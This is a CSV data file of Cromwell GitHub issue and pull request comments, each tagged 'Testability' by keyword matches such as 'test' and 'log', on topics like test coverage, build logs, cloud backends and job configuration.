Testability,"@scottfrazer Yes, that's right. If you take a look to the build logs you will see what your are saying.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-192365299:64,log,logs,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-192365299,1,['log'],['logs']
Testability,"@scottfrazer re compile errors, yeah i made a tiny change on my last commit which I wouldn't think would break anything so didn't bother to test it. oops.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/323#issuecomment-164598423:140,test,test,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/323#issuecomment-164598423,1,['test'],['test']
Testability,@scottfrazer what testing have you done on this branch against JES?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134729975:18,test,testing,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134729975,1,['test'],['testing']
Testability,@scottfrazer when ready for review (or even prior to that) can you put up a gist demonstrating what the logging enhancements are? A before/after would be super awesome.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/254#issuecomment-151205924:104,log,logging,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/254#issuecomment-151205924,1,['log'],['logging']
Testability,"@seandavi Ah, it's something @kcibul whipped up which runs on google app engine which presents the JES API for trivial tasks - we've been using it to be able to run things which test the cromwell engine under load w/o having need to run up a large bill (or run into quota issues!) on JES. I've been starting to use it heavily and have run into some weird issues, such as this ticket and those unexpected actor death notifications from the other issue. I've been theorizing that they're due to responses from appengine which we don't see in JES but i need to verify that - and clearly that's not the case w/ the unexpected actor death ones.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1662#issuecomment-260527636:178,test,test,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1662#issuecomment-260527636,2,['test'],['test']
Testability,"@seandavi Gotcha, this might be another case of ""frightening log message"" if you were detecting it via cromwell, although IIRC we squelched those specifically as they were too spammy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645342:61,log,log,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645342,1,['log'],['log']
Testability,"@seandavi To throw out another possibility would you be just as (or even more) happy w/ user defined labeling? We've discussed both and personally I've been leaning towards the latter as it seems like it could cover the former and is more flexible. Either way it might be a bit (or not, one never knows) - the reason this doesn't currently exist is our one primary internal use case for batch submit is firecloud and they're already managing logical collections of workflows using their own data model, so one batch submit might represent multiple logical collections.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1666#issuecomment-260670462:442,log,logical,442,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1666#issuecomment-260670462,2,['log'],['logical']
Testability,"@tmooney I'm no longer a Cromwell team member so take this with a grain of salt, but adding that CWL as a centaur test would likely be a great path - including if we can cajole the team into folding that into the GCP tests :P",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525135684:114,test,test,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525135684,2,['test'],"['test', 'tests']"
Testability,@tom-dyar Based on the logs it appears cromwell is expecting to find the outputs locally. Since Funnel is running against AWS Batch those files are either being moved around on the AWS VM or being uploaded to S3. I think to get this working you would need to setup cromwell's `root` storage in the config to point to an S3 bucket. . @mcovarr I am not quite sure how cromwell can protect against this sort of config issue. One idea would be to inspect the OutputFileLog in the TES Task message and check the URL's of all of the output files.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3743#issuecomment-395576505:23,log,logs,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3743#issuecomment-395576505,1,['log'],['logs']
Testability,"@tom-dyar Pull latest and try it now. My initial test is working and I'm running remaining Centaur tests on the code base. S3 FS support was added tonight in aa99ec2. Please open a new issue with the AWS Backend label for any bugs you see. This is still super-early, so I'm sure we'll run into some stuff. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3427#issuecomment-394931237:49,test,test,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3427#issuecomment-394931237,2,['test'],"['test', 'tests']"
Testability,"@vanajasmy Everyone does `git` things a little differently and there are probably many, many ways to do this. The way I'd approach this would be:. 1. Make a feature branch for your changes, instead of using your `develop`. That will let you keep your changes even when you re-sync your `develop` branch with ours. You can do that with `git checkout -b new_branch_name`; 2. So now you can re-sync _your_ `develop` branch to match the head of _our_ `develop` branch. First switch back to develop (`git checkout develop`) and do something like these [sample instructions](https://gist.github.com/glennblock/1974465) (but replace `master` with `develop`!).; 3. You should now have an up to date copy of `develop` and your own changes on a feature branch. But your feature branch will include all changes made since the last time you sync'd, including your previous changeset. So now you'll want to rebase your feature branch onto the new head of your `develop` (`git rebase -i develop new_branch_name`). You'll be asked to pick which commits you want to keep on your branch. Delete any old lines from the commit log apart from the new ones you want in this PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5516#issuecomment-628714704:1108,log,log,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5516#issuecomment-628714704,1,['log'],['log']
Testability,"@vortexing - task input and output data staging is handled by the `ecs-proxy` container that is installed when you create a custom AMI with ""cromwell"" settings. If you are not seeing data move in/out a good place to check for errors is the Cloudwatch log for a task that didn't have it's data staged correctly. Append `-proxy` to the job's cloudwatch log url to get the logging generated by the `ecs-proxy`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-467676845:251,log,log,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-467676845,3,['log'],"['log', 'logging']"
Testability,"@vsoch @geoffjentry We did manage to get it working, with some caveats. We also haven't really tested it very extensively yet.; These are the relevant lines from the backend configuration:; ```; submit-docker = """"""; echo ' \; CROMWELLROOT=$(echo ${cwd} | sed ""s/cromwell-executions\\/.*/cromwell-executions/"") && \; sed -i ""s/\\/exports\\//\\/data\\//g"" ${cwd}/execution/script && \; chmod 775 ${cwd}/execution/script && \; singularity exec --bind /exports:/data/,$CROMWELLROOT:/config docker://${docker} ${script}' | \; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe BWA ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr; """"""; dockerRoot = ""/config""; ```; > This only works if your container has both a /data and /config mount point. I tested this (very shallowly) using biocontainers. Line by line:; 1. `CROMWELLROOT=$(echo ${cwd} | sed ""s/cromwell-executions\\/.*/cromwell-executions/"")` ; 1. If dockerRoot is `/cromwell-executions`; 2. The script will contains paths like: `/cromwell-executions/test/<hash>/call-task/execution/rc`; 3. Therefore we need to have the entire structure under the root of the execution folder mounted, as such, we need to bind the entire execution folder.; 4. This gets the path to the root of the execution folder.; - I also tried setting dockerRoot to be the same as `cwd`: `dockerRoot = ""${cwd}""`, but this resulted in `${cwd}` being placed literally in the execution script. If this had been an option we wouldn't have to bind the execution directory separately (I think), but since it isn't we do have to do so.; 1. `sed -i ""s/\\/exports\\//\\/data\\//g"" ${cwd}/execution/script` ; - This a bit of a nasty workaround to convert absolute paths used in the commands to what their path would be in the container. This is necessary if you have (eg.) a String type output directory in a command. There are other ways of dealing with this, you could make a /data directory which links to /expo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-424631799:95,test,tested,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-424631799,2,['test'],['tested']
Testability,"@vsoch Thanks for testing this! This was indeed a major oversight on my behalf. . I did some further testing:. + It does not matter if you use a hashed container. Singularity will still look it up on the internet.; + The singularity cache does not store the file in an easily retrievable way:. ```; ~/.singularity/cache/oci-tmp/7c7e798af52365c2fa3c1c4606dcf8c1e2d5e502f49f1185d774655648175308$ ls; fastqc_0.11.9--0.sif fastqc@sha256_319b8d4eca0fc0367d192941f221f7fcd29a6b96996c63cbf8931dbb66e53348.sif; ```; You would have to hack with find etc. Dammit, this means this solution only works for fully connected nodes. And it means an alternate (more robust) solution needs to be hacked together in bash :scream: . On the other hand, I feel this could be fixed easily by singularity having a `--use-cache-first` flag, so it checks the cache first instead of checking the internet. I will investigate what is possible upstream.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631329498:18,test,testing,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631329498,2,['test'],['testing']
Testability,"@wleepang @markjschreiber . I also ran into this issue on several workflows that each ran for 28 hours before failing. Similar to XLuyu, it was in a scattered task. I can't access the logs for the server which failed because Batch terminated it. I suspect that something happened while provisioning the server... through the UserData: https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/gwfcore/gwfcore-launch-template.template.yaml#L127. Under that assumption, the fetch_and_run script would have never been installed to the correct location, but the job continued to execute. I see that in some places, you have checks for things such as when the awscli fails to install, then the machine is shutdown. https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/gwfcore/gwfcore-launch-template.template.yaml#L127. Perhaps there should be a validation step to ensure that the machine is correctly provisioned? Alternatively, is it possible to `set -e` directly in the UserData runcmd? I see that `set -e` is set within some scripts, such as `provision.sh`: https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/ecs-additions/provision.sh#L3. Another thought... I see that in the UserData script, there are some calls out to the network. Would it make sense to set AWS_RETRY_MODE=adaptive in such cases to help protect against random network failures?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5872#issuecomment-730119341:184,log,logs,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5872#issuecomment-730119341,1,['log'],['logs']
Testability,"@wleepang Ultimately the answer will be ""Look at how the PAPI2 backend handles CWL, map the concepts to Batch, and there ya go"", but unfortunately there wasn't one single PR to make CWL work in PAPI2. Prior to the fall it was in a state of it sorta worked, but very poorly on the kinds of special case scenarios we're talking about. At that point Thibault embarked on a project with @chapmanb to make sure it worked for `bcbio` (which IMO is sort of a torture test for these kinds of CWL constructs). . The further bad news is that there's still not a single PR, but from digging around a bit this seems to be a decent start: #4358 #4371 #4386 #4448",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-459109317:460,test,test,460,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-459109317,1,['test'],['test']
Testability,"@yfarjoun @meganshand If I point you to a cromwell branch that might fix this problem, is this something you could easily test ?; I did some testing on my own and it's definitely better but hard to tell if it would really solve this without actually testing it for real.; If the answer is ""you can run this WDL yourself and check"" that's also fine. Just need to have access to all the inputs (and figure out how to get permission to run something on SGE..)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-288849829:122,test,test,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-288849829,3,['test'],"['test', 'testing']"
Testability,@ysp0606 FYI we've had to disable our Alibaba tests for Cromwell while we wait for our OSS access to be restored. More info in https://broadworkbench.atlassian.net/browse/BA-6345. On our last update we gave Alibaba support a temporary access key from our account so they can try and debug the error code.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5467#issuecomment-606119666:46,test,tests,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5467#issuecomment-606119666,1,['test'],['tests']
Testability,"A bit more info on this. The job mentioned above ran out of disk space. The monitoring.log is full of ""out of space"" errors. However, the job ran to completion and the output directory has an rc file containing 0, so Cromwell considered it a success. But the output files were truncated to zero bytes, presumably due to the disk space issue. Normally we get a hard failure when we run out of disk space but not in this case for some reason.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4006#issuecomment-417449997:87,log,log,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4006#issuecomment-417449997,1,['log'],['log']
Testability,"A couple of other observations:; 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded.; 2. We currently have the Travis PR build marked as Required in GitHub. Circle has each test suite split out into its own check. This is great if we want finer control over which tests must pass before merging. This is not so great if we want all PR test suites to succeed because we have to do extra maintenance in GitHub as we add/remove test suites.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432:190,test,tests,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432,5,['test'],"['test', 'tests']"
Testability,A few minor comments on the tests. Not sure if you meant to address the actor spinning off `Future`s in this PR or a later one. Otherwise :+1: . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/562/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-198101594:28,test,tests,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-198101594,1,['test'],['tests']
Testability,A few more questions occurred to me - ; - was the imports zip the same in each workflow?; - were the workflows all the same?; - do you have any logs from the sender to check that a zip was indeed sent?; - were they submitted as a series of 999 separate submits or as a single batch submit POST?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-422576975:144,log,logs,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-422576975,1,['log'],['logs']
Testability,"A fix for this issue would be much appreciated! It is particularly frustrating as the check-alive config parameter sounds like exactly the test I want cromwell to run, but it is actually for different usecase.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380667549:139,test,test,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380667549,1,['test'],['test']
Testability,A new centaur test has been added based on an existing one (`cwl_prefix_for_array`) that was from a previous example CWL of mine 😄 . Looks like whatever was causing that timeout didn't recur this go around.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525940334:14,test,test,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525940334,1,['test'],['test']
Testability,A resume option with call cache skipping would be very useful. Another feature which could be related to this option is unit test capabilities. for example I had run a workflow before (successfully). now I have changed a specific part of it and just want to test it with the inputs provided till that step.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-1201794626:125,test,test,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-1201794626,4,['test'],['test']
Testability,"A server mode CLI would be able to interact with Cromwell's REST endpoints, which the current one can't do. It would probably not even be part of the Cromwell codebase per se and could be done in any language. We're maybe overloading the term CLI a little bit but what I'm thinking of is something like ; ```bash; $ cromwell-cli --url=localhost:8000 --run ""my_workflow.wdl""; submitted 9d658883-2abe-484f-83fe-06731a768057; $ cromwell-cli --url=localhost:8000 --status 9d658883-2abe-484f-83fe-06731a768057; Running; $ cromwell-cli --url=localhost:8000 --logs 9d658883-2abe-484f-83fe-06731a768057; stdout: ...; stderr: ...; backendLogs: ... etc..; ```. Could even be more interactive than that like . ```bash; $ cromwell-cli console; --- Welcome to Cromwell ! ---; > run ""my_workflow.wdl""; submitted 9d658883-2abe-484f-83fe-06731a768057; > status 9d658883-2abe-484f-83fe-06731a768057; Running; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1492#issuecomment-325469974:553,log,logs,553,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1492#issuecomment-325469974,1,['log'],['logs']
Testability,"A similar patch was tested by @jsotobroad. Once this PR against develop is reviewed & merged, we can submit another PR against master, and _that one_ should make #695 good to go.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/728#issuecomment-213246179:20,test,tested,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/728#issuecomment-213246179,1,['test'],['tested']
Testability,A/C write a unit test that characterizes the performance of heartbeat writing with and without autocommit.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4249#issuecomment-443798416:17,test,test,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4249#issuecomment-443798416,1,['test'],['test']
Testability,"A/C:; - AWS Jenkins success restored; - **At least one** `standardTestCase` WDL is turned on in Travis too, so that these issues are caught sooner. https://github.com/broadinstitute/cromwell/blob/910183057169726ec9949097077f471ec90c9ecb/src/ci/bin/testCentaurAws.sh#L27-L28. May also be related to #4294.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4314#issuecomment-433164126:248,test,testCentaurAws,248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4314#issuecomment-433164126,1,['test'],['testCentaurAws']
Testability,AC: Add a centaur test for this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-490179854:18,test,test,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-490179854,1,['test'],['test']
Testability,"AC: Confirm that this is reproducible behavior in the latest version of Cromwell, and given thats the case, confirm that job/workflow failure messages make it over to the workflow logs (not just the server logs)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4310#issuecomment-444617466:180,log,logs,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4310#issuecomment-444617466,2,['log'],['logs']
Testability,"AC:. **Case 1:** ; Benchmark the behavior of these endpoints given a few different style of workflows:; Option A: Hello World workflow; Option B: Five Dollar Genome workflow; Option C: CGA Production Workflow. For each case, run concurrent requests to the `/describe` endpoint , benchmark the response time and do so for a variety of concurrent requests: 15, 30, 50, 100... **Case 2:**; Another case can be to see how many raw GitHub pages we can resolve (via http imports) before we start seeing issues from Github -- and observe we fail gracefully.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456965771:19,Benchmark,Benchmark,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456965771,2,"['Benchmark', 'benchmark']","['Benchmark', 'benchmark']"
Testability,"AFAIK this isn't a feature yet. I looked into Cromwell's logging system to see if I could come up with a hack, but it's a bit beyond me. See also: https://github.com/broadinstitute/cromwell/issues/3919",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6337#issuecomment-1201862007:57,log,logging,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6337#issuecomment-1201862007,1,['log'],['logging']
Testability,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2494,log,logging,2494,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532,9,['log'],"['log', 'logback', 'logging', 'logs']"
Testability,"AWS Batch; [2018-11-21 15:09:10,80] [info] dockerImage: ubuntu:latest; [2018-11-21 15:09:10,80] [info] jobQueueArn: arn:aws:batch:us-east-1:267795504649:job-queue/GenomicsHighPriorityQue-ae4256f76f07d96; [2018-11-21 15:09:10,80] [info] taskId: test.hello-None-1; [2018-11-21 15:09:10,80] [info] hostpath root: test/hello/02306258-436a-4372-ab54-2dcd83c42b47/None/1; [2018-11-21 15:09:14,56] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: job id: 77106e8d-c518-4c0d-82e9-3f23e1f07040; [2018-11-21 15:09:14,62] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from - to Running; [2018-11-21 15:09:37,18] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from Running to Succeeded; [2018-11-21 15:09:39,33] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; }; [2018-11-21 15:09:39,37] [info] WorkflowManagerActor WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47 is in a terminal state: WorkflowSucceededState; [2018-11-21 15:09:43,77] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; {; ""outputs"": {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; },; ""id"": ""02306258-436a-4372-ab54-2dcd83c42b47""; }; [2018-11-21 15:09:44,59] [info] Workflow polling stopped; [2018-11-21 15:09:44,60] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] Aborting all running workflows.; [2018-11-21 15:09:44,61] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] WorkflowStoreActor stopped; [2018-11-21 15:09:44,61] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:4044,test,test,4044,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['test'],['test']
Testability,"Abandoning this PR. @kcibul's feature requests should be captured in another ticket. @tovanadler is going to look at reimplementing her basic changes in #329 on the latest `develop`, and testing manually to ensure the scopes are all correct.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-168716322:187,test,testing,187,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-168716322,1,['test'],['testing']
Testability,AccessDenied for the raw log. I can't see anything attempting to compile CWL in the cooked log. `src/bin/travis/test.sh` is shown as running for 0.01 seconds. 😕,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2788#issuecomment-339511828:25,log,log,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2788#issuecomment-339511828,3,"['log', 'test']","['log', 'test']"
Testability,Actually @kshakir pointed out that the test coverage on this patch is reported as 0% which given what it looks like the test is trying to do is kind of surprising...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5043#issuecomment-505180523:39,test,test,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5043#issuecomment-505180523,2,['test'],['test']
Testability,"Actually I want to move where this call happens, but I haven't tested this change yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/217#issuecomment-145304240:63,test,tested,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/217#issuecomment-145304240,1,['test'],['tested']
Testability,"Actually I'd like to add a Centaur integration test for this, I can hopefully get this done today.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5103#issuecomment-518583719:47,test,test,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5103#issuecomment-518583719,1,['test'],['test']
Testability,"Actually the more I'm digging into this I take it all back. For now. The `zones` field in the Cromwell code doesn't seem to be actually used anywhere except for tests. . Thining about it now I have a recollection that this was part of the cloud formation setup for the batch configuration. I'll need to dig into this unless @wleepang swoops in with some wizardly knowledge. BTW, it could be (and would make sense) that `~/.aws/conf` file is getting picked up via one of the Amazon libraries Cromwell is using. But I see no evidence that it's being directly used by Cromwell itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493269281:161,test,tests,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493269281,1,['test'],['tests']
Testability,"Actually, micro concern: does our workflow-logs copier need updating to reflect more than 1 Cromwell log file? (I don't know who might know the answer to this)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1692#issuecomment-261995390:43,log,logs,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1692#issuecomment-261995390,2,['log'],"['log', 'logs']"
Testability,"Actually... @aednichols has some ""run a single workflow mode"" tests - it might be nice to add this situation to those so we can avoid any regressions here. Does that sounds feasible to you Adam (or is it a much bigger change)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-543828698:62,test,tests,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-543828698,1,['test'],['tests']
Testability,"Adam and Jeff;; Thanks for this. I'm definitely agreed I don't want to break your tests every time we accidentally introduce a bug in bcbio. We have tagged versions of the Docker images (https://quay.io/repository/bcbio/bcbio-vc?tab=tags) so could pin to a specific CWL with a specific Docker tag. Data doesn't change as often in a back-incompatible way but you could also have a copy of that if it becomes an issue. We could generate CWL that ties to a specific Docker build, or just have your tests download the tagged version we've tested on. How aggressive is Cromwell at updating the local Docker version based on what's in the CWL? If it would leave a pre-downloaded and ready to go Docker alone, it seems like a pre-pull from a known tag and the pinned CWL should do most of what we need. Would that work?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4613#issuecomment-460720610:82,test,tests,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4613#issuecomment-460720610,3,['test'],"['tested', 'tests']"
Testability,Added a basic regression test that verifies our deadlock workaround.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/424#issuecomment-180579934:25,test,test,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/424#issuecomment-180579934,1,['test'],['test']
